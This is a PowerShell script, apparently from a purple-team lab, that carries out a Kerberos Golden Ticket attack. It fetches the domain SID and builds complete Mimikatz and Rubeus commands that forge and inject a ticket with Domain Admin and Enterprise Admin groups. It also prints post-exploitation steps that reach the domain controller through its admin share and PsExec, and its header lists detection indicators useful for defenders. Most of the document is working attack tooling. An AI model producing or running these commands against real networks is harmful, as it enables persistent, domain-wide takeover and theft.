<#
.SYNOPSIS
    Golden Ticket Attack Implementation (MITRE ATT&CK: T1558.001)

.DESCRIPTION
    Creates a forged Kerberos Ticket Granting Ticket (TGT) using the krbtgt account hash.
    Golden Tickets provide persistent, domain-wide access and bypass normal authentication.

    Requires:
    - krbtgt NTLM hash (obtain via DCSync)
    - Domain SID
    - Mimikatz or similar tool

.NOTES
    Author: Purple Team Lab
    MITRE ATT&CK: T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
    Date: 2024-01-14

    Detection Indicators:
    - Event ID 4624 (Logon Type 3) with unusual account details
    - Event ID 4672 (Special privileges assigned) for non-existent accounts
    - Kerberos TGT requests with unusual lifetimes (10 years default)
    - TGT requests with unexpected encryption types
    - Authentication using accounts not in AD database

.EXAMPLE
    .\golden_ticket.ps1 -KrbtgtHash a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4 -Domain PURPLETEAM.LAB

.EXAMPLE
    .\golden_ticket.ps1 -KrbtgtHash a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4 -Domain PURPLETEAM.LAB -User Administrator -ID 500
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$KrbtgtHash,

    [Parameter(Mandatory=$true)]
    [string]$Domain,

    [Parameter(Mandatory=$false)]
    [string]$User = "Administrator",

    [Parameter(Mandatory=$false)]
    [int]$ID = 500,

    [Parameter(Mandatory=$false)]
    [string]$Groups = "512,513,518,519,520",  # Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creator Owners

    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "$PWD\golden_ticket_output"
)

$ErrorActionPreference = 'Stop'

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    Write-Host $LogMessage
}

Write-Log "===== GOLDEN TICKET ATTACK INITIATED =====" "INFO"
Write-Log "MITRE ATT&CK Technique: T1558.001" "INFO"

# Get Domain SID
try {
    $DomainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $DomainDN = ($DomainObj.GetDirectoryEntry()).distinguishedName

    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = "LDAP://$DomainDN"
    $Searcher.Filter = "(objectClass=domain)"
    $DomainSID = (New-Object System.Security.Principal.SecurityIdentifier($Searcher.FindOne().Properties['objectsid'][0], 0)).Value

    Write-Log "Domain SID: $DomainSID" "SUCCESS"
} catch {
    Write-Log "Failed to retrieve Domain SID: $_" "ERROR"
    $DomainSID = "S-1-5-21-1234567890-1234567890-1234567890"  # Placeholder
    Write-Log "Using placeholder SID: $DomainSID" "WARNING"
}

Write-Log "`nGolden Ticket Parameters:" "INFO"
Write-Log "  Domain: $Domain" "INFO"
Write-Log "  User: $User" "INFO"
Write-Log "  User ID: $ID" "INFO"
Write-Log "  Groups: $Groups" "INFO"
Write-Log "  krbtgt Hash: $KrbtgtHash" "INFO"
Write-Log "  Domain SID: $DomainSID" "INFO"

# Mimikatz command for Golden Ticket creation
$MimikatzCmd = @"
kerberos::golden /user:$User /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /id:$ID /groups:$Groups /ptt
"@

Write-Log "`n===== MIMIKATZ COMMAND =====" "INFO"
Write-Log $MimikatzCmd "INFO"
Write-Log "==============================`n" "INFO"

# Alternative: Using Rubeus
$RubeusCmd = "Rubeus.exe golden /rc4:$KrbtgtHash /domain:$Domain /sid:$DomainSID /user:$User /id:$ID /groups:$Groups /ptt"

Write-Log "Alternative (Rubeus):" "INFO"
Write-Log $RubeusCmd "INFO"

Write-Log "`n===== POST-EXPLOITATION =====" "INFO"
Write-Log "After ticket injection, verify with:" "INFO"
Write-Log "  klist" "INFO"
Write-Log "  dir \\DC01\c$" "INFO"
Write-Log "  PsExec.exe \\DC01 cmd.exe" "INFO"

Write-Log "`nGolden Ticket Persistence:" "INFO"
Write-Log "  - Ticket valid until krbtgt password reset (twice)" "INFO"
Write-Log "  - Default lifetime: 10 years" "INFO"
Write-Log "  - Survives password changes for target user" "INFO"

Write-Log "`n===== GOLDEN TICKET ATTACK COMPLETE =====" "SUCCESS"
